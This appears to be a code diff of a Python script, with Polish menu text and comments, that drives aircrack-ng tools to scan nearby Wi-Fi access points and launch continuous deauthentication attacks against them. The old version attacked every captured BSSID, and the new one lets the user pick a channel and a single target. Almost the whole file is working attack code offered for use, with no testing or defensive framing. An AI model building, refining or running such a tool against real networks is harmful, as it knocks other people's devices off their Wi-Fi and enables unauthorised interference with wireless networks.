@@ -14,53 +14,54 @@ def start_monitor_mode(interface_name):
     os.system(f"sudo airmon-ng start {interface_name}")
 
 def capture_bssid(interface_name):
-    os.system(f"sudo timeout 5 airodump-ng {interface_name}mon > airodump.txt")
+    os.system(f"sudo timeout 5 airodump-ng {interface_name} > airodump.txt")
     os.system("grep -E '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' airodump.txt | awk '$6 ~ /^[1-9][0-9]*$/ && $11 !~ /^</ {print $1, $6, $11}' | sort | uniq > bssid.txt")
     os.system("rm airodump.txt")
     with open("bssid.txt", "r") as file:
         print(file.read())
 
 def set_channel(interface_name, channel):
-    os.system(f"sudo iwconfig {interface_name}mon channel {channel}")
+    os.system(f"sudo iw {interface_name} set channel {channel}")
 
-def deauth_attack(interface_name, bssid, channel):
-    set_channel(interface_name, channel)  # Ustaw kanał przed atakiem
-    os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface_name}mon")
+def deauth_attack(interface_name, bssid):
+    os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface_name}")
 
 def stop_monitor_mode(interface_name):
-    os.system(f"sudo airmon-ng stop {interface_name}mon")
+    os.system(f"sudo airmon-ng stop {interface_name}")
     os.system("sudo systemctl restart NetworkManager")
-
-def perform_deauth_on_all_bssids(interface_name):
-    with open("bssid.txt", "r") as file:
-        for line in file:
-            bssid, channel, _ = line.split()
-            print(f"Przeprowadzanie ataku deauth na BSSID: {bssid} na kanale {channel}")
-            deauth_attack(interface_name, bssid, channel)
 
 def main():
     interface_name = get_active_interface()
-    print("\n1) Przechwyc BSSID.")
-    print("2) Atak deauth na wszystkich BSSID.")
-    print("0) Zakończ działanie programu.")
+    while True:
+        print("\n1) Przechwyc BSSID.")
+        print("2) Wybierz kanał.")
+        print("3) Atak deauth.")
+        print("0) Zakończ działanie programu.")
 
-    choice = input("Wybierz opcję: ")
+        choice = input("Wybierz opcję: ")
 
-    if choice == "1":
-        start_monitor_mode(interface_name)
-        capture_bssid(interface_name)
-        press_to_continue()
-    elif choice == "2":
-        start_monitor_mode(interface_name)  # Upewnij się, że jesteśmy w trybie monitorowania
-        perform_deauth_on_all_bssids(interface_name)
-        press_to_continue()
-    elif choice == "0":
-        stop_monitor_mode(interface_name)
-        os.system("rm bssid.txt")
-        print("Wyjście.")
-    else:
-        print("Nieprawidłowy wybór. Wybierz jeszcze raz, badź wybierz '0' aby wyjść!.")
-        press_to_continue()
+        if choice == "1":
+            start_monitor_mode(interface_name)
+            capture_bssid(interface_name)
+            press_to_continue()
+        elif choice == "2":
+            channel = input("Wpisz numer kanału, na którym chcesz przeprowadzić atak deauth: ")
+            set_channel(interface_name, channel)
+            press_to_continue()
+        elif choice == "3":
+            with open("bssid.txt", "r") as file:
+                print(file.read())
+            bssid = input("Podaj BSSID, na którym chcesz przeprowadzić atak deauth: ")
+            deauth_attack(interface_name, bssid)
+            press_to_continue()
+        elif choice == "0":
+            stop_monitor_mode(interface_name)
+            os.system("rm bssid.txt")
+            print("Wyjście.")
+            break
+        else:
+            print("Nieprawidłowy wybór. Wybierz jeszcze raz, badź wybierz '0' aby wyjść!.")
+            press_to_continue()
 
 if __name__ == "__main__":
     main()
